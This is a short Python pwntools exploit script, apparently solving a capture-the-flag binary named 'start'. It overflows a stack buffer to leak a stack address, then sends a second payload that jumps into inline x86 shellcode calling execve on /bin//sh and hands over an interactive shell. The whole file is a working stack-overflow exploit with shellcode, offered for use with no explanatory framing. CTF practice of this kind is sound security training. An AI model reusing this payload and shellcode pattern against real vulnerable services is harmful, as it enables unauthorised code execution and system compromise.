from pwn import *


context.binary = exe = ELF('./start', checksec=False)
p=process(exe.path)
gdb.attach(p,gdbscript=
    '''
    b*_start

    '''
    )
input()
offset=0x14
#binsh=6E 69 62 2F 68 73 2F 2F
shellcode=asm(
    '''
    push 0x00000000
    push 0x68732F2F
    push 0x6E69622F
    xor eax,eax
    xor ebx,ebx
    xor ecx,ecx
    xor edx,edx
    mov eax,0xb
    mov ebx,esp
    int 0x80
    '''
    )
payload=b"A"*offset+p32(0x08048087) #write
p.sendafter(b"CTF:",payload)
stackleak=int.from_bytes(p.recv(4),"little")
log.info("[+]stackleak:"+hex(stackleak))


payload2=b"A"*20
payload2+=p32(stackleak+20)
payload2+=shellcode
p.send(payload2)

p.interactive()
